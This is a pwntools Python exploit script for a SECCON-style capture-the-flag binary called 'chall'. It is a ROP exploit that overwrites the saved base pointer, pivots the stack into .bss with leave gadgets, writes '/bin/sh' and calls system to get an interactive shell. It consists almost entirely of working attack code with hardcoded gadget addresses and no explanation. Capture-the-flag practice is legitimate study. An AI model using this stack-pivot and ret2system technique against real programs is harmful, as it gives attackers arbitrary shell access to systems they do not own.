#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template chall
from pwn import *

# Set up pwntools for the correct architecture
#exe = context.binary = ELF('chall_patched')
exe = context.binary = ELF('chall')
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
sh = b'/bin/sh\x00'

sys = 0x000401054

call_sys = 0x0401169

bss = 0x404900

prepare_rdi=0x401171

got_gets =  0x00404020

plt_gets = 0x00401060

pop_rbp = 0x040113d

leave = 0x00401183

rbp_part = b'A'*16 #dummy
rbp_part+=p64(bss-0x200) #new rbp adress
rbp_part+=p64(prepare_rdi) #call gets to this addr

#prepare rdi is lea rdi,[rbp-0x10]; call gets

io = start()
#io = remote('rop-2-35.seccon.games' ,9999)
pause()

io.sendline(rbp_part) #overwrite rbp

payload = sh #/bin/sh
payload+=b'A'*(16-len(sh)) #align
payload+=p64(bss-0x100) #new rbp
payload+=p64(pop_rbp) #pop rbp
payload+=p64(bss) #new rbp after leave
payload+=p64(leave) #stack pivoting
payload+=p64(bss)  
payload+=(0x210-len(payload))*b'a' #padding to next rop gadjet(to return after pivoting)
payload+=p64(bss)
payload+=p64(call_sys) #call system

io.sendline(payload)

io.interactive()

